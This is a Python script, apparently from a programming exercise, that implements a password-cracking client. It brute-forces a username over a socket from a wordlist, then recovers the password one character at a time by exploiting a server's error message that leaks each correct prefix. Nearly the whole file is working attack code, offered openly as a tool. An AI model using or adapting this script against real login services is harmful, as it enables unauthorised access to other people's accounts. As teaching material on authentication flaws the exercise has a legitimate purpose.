import logging
import socket
import sys
import json
import string
from itertools import product


class PasswordHacker:
    def __init__(self, hostname: str, port: int):
        self.hostname: str = hostname
        self.port: int = port
        self.address: tuple[str, int] = (self.hostname, self.port)
        self.login_file: str = r'hacking\logins.txt'
        self.login: str = ''
        self.password: str = ''
        logging.basicConfig(filename=r'hacking\newfile.log',
                            format='%(asctime)s %(message)s',
                            filemode='w')
        self.logger: logging.Logger = logging.getLogger()
        self.logger.setLevel(logging.DEBUG)

    def start(self):
        with socket.socket() as self.my_socket:
            self.my_socket.connect(self.address)
            self.find_login()
            self.find_password()
            self.print_output()

    def find_login(self):
        self.logger.debug("Start self.find_login()")
        with open(self.login_file) as file:
            password = '1'
            for line in file:
                line = line.strip()
                for login in map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in line))):
                    self.my_socket.send(json.dumps({'login': login, 'password': password}).encode())
                    response = json.loads(self.my_socket.recv(1024).decode())
                    if response['result'] == 'Wrong password!':
                        self.login = login
                        self.logger.debug(f"Found the login - {self.login}")
                        return

    def find_password(self):
        self.logger.debug("Start self.find_password()")
        symbols: str = string.ascii_letters + string.digits + string.punctuation
        password = ''
        while not self.password:
            for letter in symbols:
                # self.logger.debug(f"Try the letter - {letter}")
                my_json_data: str = json.dumps({'login': self.login, 'password': (password + letter)})
                self.my_socket.send(my_json_data.encode())
                response = json.loads(self.my_socket.recv(1024).decode())
                if response['result'] == 'Wrong password!':
                    # self.logger.debug(f"No...")
                    continue
                elif response['result'] == 'Exception happened during login':
                    password += letter
                    self.logger.debug(f"Exception happened when we sent - {password} !!!")
                    break
                elif response['result'] == 'Connection success!':
                    self.password = password + letter
                    self.logger.debug(f"Success - the password is  - {self.password} !!!!")
                    break

    def print_output(self):
        output = json.dumps({"login": self.login, "password": self.password})
        print(output)


def main() -> None:
    assert len(sys.argv) == 3
    hacker = PasswordHacker(hostname=sys.argv[1], port=int(sys.argv[2]))
    hacker.start()


if __name__ == '__main__':
    main()
